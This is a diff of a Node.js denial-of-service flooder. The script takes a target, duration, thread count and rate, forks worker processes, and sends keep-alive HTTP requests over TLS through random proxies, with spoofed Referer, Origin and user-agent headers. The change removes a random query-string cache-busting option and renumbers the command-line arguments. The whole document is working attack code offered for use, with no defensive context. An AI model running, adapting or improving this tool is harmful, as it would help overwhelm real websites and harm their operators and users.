@@ -10,14 +10,13 @@ const path = require("path");
 const http = require('http');
 const tls = require('tls');
 const execSync = require('child_process').execSync;
-const cryptoRandomString = require('crypto-random-string');
 
 
 var target = process.argv[2];
 var time = process.argv[3];
 var thread = process.argv[5];
 var rate = process.argv[6];
-var method = process.argv[8];
+var method = process.argv[7];
 
 
 var fileName = __filename;
@@ -73,9 +72,6 @@ process.setMaxListeners(15);
 
 
 const cluster = require('cluster');
-// const { cpus } = require('os');
-
-// // const numCPUs = cpus().length;
 const numCPUs = thread;
 
 if (cluster.isPrimary) {
@@ -90,14 +86,6 @@ if (cluster.isPrimary) {
 } else {
 
     setInterval(function() {
-
-        if (process.argv[7] == 'true' ){
-            var randstr = '/' + '?' + cryptoRandomString({ length: 1,characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'}) + '=' + cryptoRandomString({length: 8}) + cryptoRandomString({ length: 1,characters: '|='}) + cryptoRandomString({ length: 8}) + cryptoRandomString({ length: 1, characters: '|='}) + cryptoRandomString({ length: 8       }) + '&' + cryptoRandomString({ length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'  }) + '=' + cryptoRandomString({ length: 8  }) + cryptoRandomString({   length: 1,   characters: '|=' }) + cryptoRandomString({  length: 8}) + cryptoRandomString({   length: 1,  characters: '|=' }) + cryptoRandomString({  length: 8 });
-        }
-
-        if (process.argv[7] == 'false' ){
-            var randstr = ''
-        }
 
         var aa = getRandomNumberBetween(100, proxies.length);
         var proxy = proxies[Math.floor(Math.random() * aa)];
@@ -148,7 +136,7 @@ if (cluster.isPrimary) {
 
                 TlsConnection.setKeepAlive(true, 10000)
                 TlsConnection.setTimeout(10000);
-                TlsConnection.write(`${method} ` + target + randstr + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nCookie: ' + proxy[1] + '\r\nOrigin: ' + target + '\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
+                TlsConnection.write(`${method} ` + target + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nCookie: ' + proxy[1] + '\r\nOrigin: ' + target + '\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
             }
         });
 
@@ -166,13 +154,11 @@ if (cluster.isPrimary) {
 
         TlsConnection.on('data', (chunk) => {
             setTimeout(function() {
-                TlsConnection.abort();
                 return delete TlsConnection
             }, 10000);
         });
 
         TlsConnection.on('end', () => {
-            TlsConnection.abort();
             TlsConnection.destroy();
         });
 
